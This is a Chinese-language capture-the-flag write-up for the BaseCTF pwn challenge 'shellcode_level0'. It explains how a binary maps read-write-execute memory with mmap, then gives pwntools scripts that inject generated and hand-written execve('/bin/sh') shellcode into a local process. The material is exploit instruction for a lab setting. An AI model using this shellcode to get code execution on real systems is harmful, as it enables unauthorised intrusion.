# Basectf pwn方向“shellcode_level0”

by Maple

题目的提示很明显，就是shellcode，反编译发现直接通过mmap函数输入,权限为7，所以直接注入shellcode就行

```python
from pwn import *
p = process('./shellcode_level0')
p.send(asm(shellcraft.sh()))
p.interactive()
```

## asm(shellcraft.sh())

`shellcraft.sh()`是一个生成shellcode的函数;`asm()`函数将shellcode汇编成机器码。

## mmap()

`mmap()`的函数原型是`void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);`

- **void addr** 指定内存映射区的起始地址。通常设置为NULL,让系统自动选择合适的地址。如果指定地址，需要确保地址对齐，并且有足够的空间
- **size_t length**:映射区的长度，以字节为单位
- **prot**:指定内存区域的保护属性
  - PROT_READ：区域可读(0x1)
  - PROT_WRITE：区域可写(0x2)
  - PROT_EXEC：区域可执行(0x4)
  - PROT_NONE；区域不可访问
- **flags**:指定映射对象的类型和可见性
  - MAP_PRIVATE：创建一个写入时复制（copy-on-write）的私有映射。对映射区域的修改不会反映到原始文件中。（0x02）
  - MAP_SHARED：创建一个共享映射。对映射区域的修改会反映到原始文件中。(0X01)
  - MAP_ANONYMOUS：创建一个匿名映射，不与任何文件关联（0x20）
- **fd**: 文件描述符，用于指定要映射的文件。如果使用MAP_ANONYMOUS，则此参数通常设置为-1
- **offset**：文件中的偏移量，指定从文件的哪个位置开始映射。通常需要是页大小的整数倍

这道题的mmap函数调用为`buf = mmap(0LL, 0x1000uLL, 7, 34, -1, 0LL)`

让系统自主选择地址

映射区长度为0x1000uLL（4096字节）

保护属性为7（PROT_READ | PROT_WRITE | PROT_EXEC）：可读可写可执行

flags为34（MAP_PRIVATE | MAP_ANONYMOUS）：创建一个私有的匿名映射

## 手写shellcode

```python
from pwn import *
p = process('./shellcode_level0')

shellcode = asm('''
    mov rax,0x68732f6e69622f
    push rax
    push rsp
    pop rdi
    push 0x3b
    pop rax
    xor esi, esi
    xor edx, edx
    syscall
''')

p.send(shellcode)
p.interactive()
```

## 这里为什么是send而不是sendline

其实写sendline也没问题，不会影响这个脚本的运行,如果深究的话，我认为是这些原因

1. 发送的是shellcode：`asm(shellcraft.sh())`生成的是机器码（二进制数据），而不是文本命令。shellcode通常不需要换行符来触发执行，因为它本身就是一段可执行的机器指令
1. 精确控制数据：使用send可以确保发送的数据完全是你生成的shellcode，没有任何额外的字符（如换行符）被添加。这可以确保shellcode正确执行。

*注意，有些题目写send或sendline得到的结果是完全不同的，但后面遇到再说吧*.